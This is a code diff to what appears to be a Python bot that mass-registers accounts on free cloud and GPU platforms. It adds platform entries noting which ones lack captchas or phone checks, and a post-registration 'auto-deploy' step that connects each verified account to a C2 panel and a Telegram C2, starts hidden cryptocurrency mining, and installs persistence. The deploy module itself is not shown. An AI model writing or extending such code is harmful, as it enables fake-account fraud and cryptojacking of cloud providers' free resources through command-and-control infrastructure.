@@ -209,18 +209,28 @@ PLATFORMS = {
     "replit": {"name": "Replit", "url": "https://replit.com/signup",
                "icon": "💻", "has_captcha": True},
     "paperspace": {"name": "Paperspace", "url": "https://console.paperspace.com/signup",
-                   "icon": "🖥️", "has_captcha": True},
+                   "icon": "🖥️", "has_captcha": False, "free_gpu": True, "no_phone": True,
+                   "description": "FREE GPU (M4000), no phone, email only"},
+    "modal": {"name": "Modal", "url": "https://modal.com",
+              "icon": "⚡", "has_captcha": False, "free_credits": "$30/month", "no_phone": True,
+              "description": "$30/month FREE, GPU (A10G/A100), GitHub auth"},
     "lightning_ai": {"name": "Lightning AI", "url": "https://lightning.ai/sign-up",
-                     "icon": "⚡", "has_captcha": True},
+                     "icon": "🌩️", "has_captcha": True},
     "devin_ai": {"name": "Devin AI", "url": "https://app.devin.ai/login",
                  "icon": "🤖", "has_captcha": False},
+    "mybinder": {"name": "MyBinder", "url": "https://mybinder.org",
+                 "icon": "📓", "has_captcha": False, "no_auth": True,
+                 "description": "Free Jupyter notebooks, no registration, CPU only, 12h limit"},
+    "azure_student": {"name": "Azure for Students", "url": "https://azure.microsoft.com/free/students",
+                       "icon": "🎓", "has_captcha": False, "requires_edu": True,
+                       "description": "$100 credits, no credit card, requires .edu email"},
     "custom": {"name": "Custom URL", "url": "", "icon": "🔧", "has_captcha": False},
 }
 
 
 class RegistrationJob:
     def __init__(self, platform, mail_provider="boomlify", custom_url="",
-                 count=1, headless=True, proxy="", browser="chrome"):
+                 count=1, headless=True, proxy="", browser="chrome", auto_deploy=None):
         self.platform = platform
         self.mail_provider = mail_provider
         self.custom_url = custom_url
@@ -228,6 +238,7 @@ class RegistrationJob:
         self.headless = headless
         self.proxy = proxy
         self.browser = browser  # 'chrome' or 'firefox'
+        self.auto_deploy = auto_deploy or {}  # Auto-deploy settings
         self.reg_id = str(uuid.uuid4())[:8]
         self.status = "pending"
         self.log_lines = []
@@ -649,6 +660,38 @@ class RegistrationJob:
                         self.log(traceback.format_exc()[-500:])
                     
                     self.log("")
+                    self.log("="*70)
+                
+                # ─── AUTO-DEPLOY: C2 Panel + Telegram + Mining ───
+                if account.get("status") == "verified":
+                    self.log("")
+                    self.log("="*70)
+                    self.log("[AUTO-DEPLOY] Connecting to C2 & Starting Mining...")
+                    self.log("="*70)
+                    
+                    try:
+                        from src.autoreg.auto_deploy import deploy_after_registration
+                        
+                        deploy_result = deploy_after_registration(
+                            account, 
+                            self.log,
+                            settings=self.auto_deploy  # Pass settings from UI
+                        )
+                        
+                        if deploy_result.get("c2_registered"):
+                            self.log("✓ C2 Panel: Connected")
+                        if deploy_result.get("telegram_connected"):
+                            self.log("✓ Telegram C2: Connected")
+                        if deploy_result.get("mining_started"):
+                            self.log("✓ Mining: Started (hidden)")
+                        if deploy_result.get("persistence_set"):
+                            self.log("✓ Persistence: Installed")
+                        
+                        account["auto_deploy"] = deploy_result
+                        
+                    except Exception as e:
+                        self.log(f"Auto-deploy error: {e}")
+                    
                     self.log("="*70)
                 
                 return account
@@ -1424,11 +1467,11 @@ class JobManager:
         self._running = False  # только одна регистрация одновременно
 
     def create_job(self, platform, mail_provider="boomlify", custom_url="",
-                   count=1, headless=True, proxy="", parallel=1, browser="chrome"):
+                   count=1, headless=True, proxy="", parallel=1, browser="chrome", auto_deploy=None):
         with self.lock:
             if self._running:
                 raise ValueError("Registration already running — wait for it to finish")
-        job = RegistrationJob(platform, mail_provider, custom_url, count, headless, proxy, browser)
+        job = RegistrationJob(platform, mail_provider, custom_url, count, headless, proxy, browser, auto_deploy=auto_deploy)
         job.parallel_count = max(1, min(parallel, 3))  # Limit to 3 parallel workers
         with self.lock:
             self.jobs[job.reg_id] = job
